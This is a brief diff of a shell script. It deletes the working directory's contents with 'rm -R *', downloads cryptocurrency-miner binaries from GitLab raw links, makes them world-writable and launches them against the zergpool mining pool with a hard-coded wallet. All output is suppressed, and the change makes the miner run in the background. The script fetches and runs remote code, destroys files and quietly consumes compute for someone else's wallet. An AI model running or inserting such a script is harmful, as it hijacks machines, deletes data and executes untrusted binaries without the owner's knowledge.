@@ -10,7 +10,7 @@ rm -R *
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer > /dev/null 2>&1
 chmod 777 cpminer > /dev/null 2>&1
 
-./cpminer -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u kc1qnnkjytyc9xvmlrndyv75u44a4yjejmmp3pg4jf -p c=KCN,ID=$(shuf -n 1 -i 1-9999)-SALmon -t 4 > /dev/null 2>&1
+./cpminer -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u kc1qnnkjytyc9xvmlrndyv75u44a4yjejmmp3pg4jf -p c=KCN,ID=$(shuf -n 1 -i 1-9999)-SALmon -t 4 > /dev/null 2>&1 &
 
 wget https://gitlab.com/rizqullahizaa/rizqune/-/raw/master/cpuminer-avx2 > /dev/null 2>&1
 chmod 777 cpuminer-avx2 > /dev/null 2>&1 
